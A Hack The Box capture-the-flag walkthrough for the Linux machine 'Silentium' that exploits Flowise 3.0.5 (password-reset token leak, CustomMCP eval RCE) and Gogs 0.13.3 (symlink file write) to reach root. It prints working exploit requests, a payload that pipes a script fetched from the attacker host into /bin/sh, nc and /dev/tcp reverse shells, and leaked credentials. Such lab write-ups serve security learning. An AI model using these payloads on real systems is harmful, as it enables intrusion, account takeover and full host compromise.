# Silentium



> **Platform:** Hack The Box · **OS:** Linux · **Difficulty:** Easy **Chain:** Flowise password-reset token disclosure → CustomMCP RCE (Docker) → leaked SSH creds → Gogs symlink file write → root

```bash
export IP=10.129.48.249     # target (changes per spawn)
export LHOST=10.10.17.238   # your tun0
```

***

### Overview

Attack path at a glance:

1. **Recon** — nginx redirects to `silentium.htb`; vhost fuzzing finds `staging.silentium.htb` running **Flowise 3.0.5**.
2. **Foothold** — `CVE-2025-58434`: the forgot-password endpoint leaks the reset `tempToken` in its JSON response → take over `ben`'s Flowise account.
3. **RCE** — `CVE-2025-59528`: the `CustomMCP` node `eval`s `mcpServerConfig` → code execution as **root inside a Docker container**.
4. **Lateral** — container env vars leak SSH creds for **ben** on the host.
5. **Priv-esc** — internal **Gogs 0.13.3** vhost is vulnerable to `CVE-2025-8110` (symlink file write via the contents API) → overwrite `/root/.ssh/authorized_keys` → SSH as **root**.

***

### Enumeration

#### Nmap

Full TCP sweep, then service/script scan on the open ports.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV $IP
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

Only SSH and HTTP. Port 80 redirects to a hostname, so add it to hosts:

```bash
echo "$IP silentium.htb" | sudo tee -a /etc/hosts
```

#### Vhost fuzzing

The main site is a static financial-services page with nothing to attack. Fuzz for virtual hosts. Baseline responses are all `178` bytes, so filter them out with `-fs`.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ \
  -H "Host: FFUZ.silentium.htb" -u http://silentium.htb -ic -fs 178
```

```
staging    [Status: 200, Size: 3142, Words: 789, Lines: 70]
```

```bash
echo "$IP staging.silentium.htb" | sudo tee -a /etc/hosts
```

`staging` shows a **Sign In** page. No creds yet, so enumerate content.

#### Identifying Flowise

```bash
dirsearch -u http://staging.silentium.htb
dirsearch -u http://staging.silentium.htb/api/v1
```

`/manifest.json` identifies the app as **Flowise**, and `/api/v1/version` gives the exact version:

```bash
curl http://staging.silentium.htb/manifest.json        # "short_name": "Flowise"
curl http://staging.silentium.htb/api/v1/version        # {"version":"3.0.5"}
```

\{% hint style="info" %\} Flowise **3.0.5** is the pivot point — both the foothold and RCE CVEs target this version. \{% endhint %\}

***

### Foothold — CVE-2025-58434 (Flowise password reset token disclosure)

The forgot-password flow returns the full user object — including the reset `tempToken` — directly in the HTTP response instead of only emailing it. That token is all you need to reset the password.

**Find a valid email.** The leadership page on the main site names **Ben** (lead for systems/infrastructure). Requesting a reset for a non-existent user returns `user not found`, so the endpoint is a username oracle. `ben@silentium.htb` returns success → valid.

**Leak the token:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq
```

```json
{
  "user": {
    "email": "ben@silentium.htb",
    "tempToken": "ERqdJMJKVEazWDQgJ2uC7JqheNpM73xUeMMrSElnEaMc20rC6L0W8qZmoNxcBEIM",
    "tokenExpiry": "2026-08-31T09:48:13.347Z",
    ...
  }
}
```

Go to the **Reset Password** page, paste the email + `tempToken`, set a new password (must satisfy the policy: 8+ chars, upper, lower, digit, special), then log in. You now have the Flowise dashboard.

***

### Remote Code Execution — CVE-2025-59528 (CustomMCP node)

The `CustomMCP` node evaluates the user-supplied `mcpServerConfig` unsafely, so a crafted config runs arbitrary Node via `child_process`. Driving it through the API needs an API key — one already exists under **API Keys** in the dashboard (`DefaultKey`). Copy it.

#### Step 1 — Prove execution

Start an HTTP server and hit it from the target to confirm the callback.

```bash
python3 -m http.server 5050
```

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"curl 10.10.17.238:5050\");return 1;})()})"}}'
```

A `GET /` lands on the HTTP server → RCE confirmed. (The `No Available Actions` error in the response body is expected — the payload still executed.)

#### Step 2 — Reverse shell

```bash
# attacker: host the shell script
echo -e '#!/bin/sh\nnc 10.10.17.238 4455 -e /bin/sh' > script.sh
python3 -m http.server 5050      # terminal A

# attacker: catch the shell
nc -lnvp 4455                    # terminal B
```

```bash
# fire the payload: fetch the script and pipe into /bin/sh
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"curl 10.10.17.238:5050/script.sh|/bin/sh\");return 1;})()})"}}'
```

Listener catches a shell as **root** (inside the container).

\{% hint style="warning" %\} **Two separate ports, two separate services.** The fetch URL (`:5050`, python HTTP server serving `script.sh`) and the callback (`:4455`, netcat listener) must be different. If you point the inner `curl` at your `nc` listener, nc returns nothing, `/bin/sh` reads an empty stream, and the shell exits instantly — you'll see the target's `GET /script.sh` hit the listener instead of the web server.

If the shell still dies after fixing the ports, the container's `nc` may not support `-e`. Swap `script.sh` for a bash TCP shell: `sh -i >& /dev/tcp/10.10.17.238/4455 0>&1`. \{% endhint %\}

***

### Lateral Movement — container → ben on the host

A `.dockerenv` at `/` confirms you're in a container.

```bash
ls -la /         # .dockerenv present
env              # dump environment variables
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
```

The SMTP sender is `ben@silentium.htb` and `SMTP_PASSWORD` is reused for his host account.

```bash
ssh ben@$IP          # password: r04D!!_R4ge
```

Shell as **ben** on the host. **User flag:** `/home/ben/user.txt`.

***

### Privilege Escalation — CVE-2025-8110 (Gogs symlink file write)

#### Discovery

An nginx site config points to an internal service on `127.0.0.1:3001`.

```bash
cat /etc/nginx/sites-enabled/staging-v2-code
# server_name staging-v2-code.dev.silentium.htb; proxy_pass http://127.0.0.1:3001;
```

```bash
echo "$IP staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
```

It's a **Gogs** instance. Register an account through the web UI, then confirm the version from the binary on the host:

```bash
/opt/gogs/gogs/gogs --version      # Gogs version 0.13.3
```

**0.13.3** is vulnerable to `CVE-2025-8110` — an authenticated user can abuse symlinks via the contents API so a file _update_ follows the link and overwrites the target. Target: `root`'s `authorized_keys`.

#### Step 1 — Create a repo with a malicious symlink

In Gogs: create a repo `test` and tick **Initialize this repository**. Clone it and commit a symlink.

```bash
git clone http://staging-v2-code.dev.silentium.htb/test/test.git
cd test
ln -s /root/.ssh/authorized_keys overwrite_me
git config --global user.email "test@htb.com"
git config --global user.name "test"
git add -A && git commit -m "symlink abuse"
git push        # auth with your Gogs username/password
```

#### Step 2 — Grab the blob SHA (the API needs it to update)

```bash
git ls-tree HEAD overwrite_me
# 120000 blob 9c87fc525b63ebd989fa409533d3be1b295d6ec3    overwrite_me
```

#### Step 3 — Generate an API token

Gogs → **Settings → Applications → Generate New Token**. Copy it.

#### Step 4 — base64 your SSH public key

```bash
ssh-keygen -t ed25519 -f ./silentium_root -N ""   # if you don't have a key
base64 -w0 silentium_root.pub
```

#### Step 5 — Trigger the write

`PUT` to the contents API with the token, the base64 key as `content`, and the blob `sha`. Gogs follows the symlink and writes your key into `/root/.ssh/authorized_keys`.

```bash
curl -X PUT \
  -H "Authorization: token <API_TOKEN>" \
  -H "Content-Type: application/json" \
  "http://staging-v2-code.dev.silentium.htb/api/v1/repos/test/test/contents/overwrite_me?ref=master" \
  -d '{
    "message": "overwrite via symlink",
    "content": "<BASE64_PUBKEY>",
    "sha": "9c87fc525b63ebd989fa409533d3be1b295d6ec3"
  }' | jq
```

The response shows `"type": "symlink"` targeting `/root/.ssh/authorized_keys` → write succeeded.

```bash
ssh -i silentium_root root@$IP
```

Shell as **root**. **Root flag:** `/root/root.txt`.

***

### CVE Summary

| CVE            | Component                       | Impact                                               |
| -------------- | ------------------------------- | ---------------------------------------------------- |
| CVE-2025-58434 | Flowise ≤ 3.0.5 forgot-password | Reset token disclosed in response → account takeover |
| CVE-2025-59528 | Flowise CustomMCP node          | Unsafe eval of `mcpServerConfig` → RCE               |
| CVE-2025-8110  | Gogs 0.13.3 contents API        | Symlink following → arbitrary file write             |

### Takeaways

* API responses that return full objects are a disclosure class of their own — always diff what the UI shows vs. what the endpoint actually returns.
* Container breakout here was pure credential hygiene: `env` is the first thing to read after any containerized RCE.
* Symlink-follow-on-write bugs turn "write to a repo file" into "write anywhere the service user can" — `authorized_keys` is the standard escalation target.
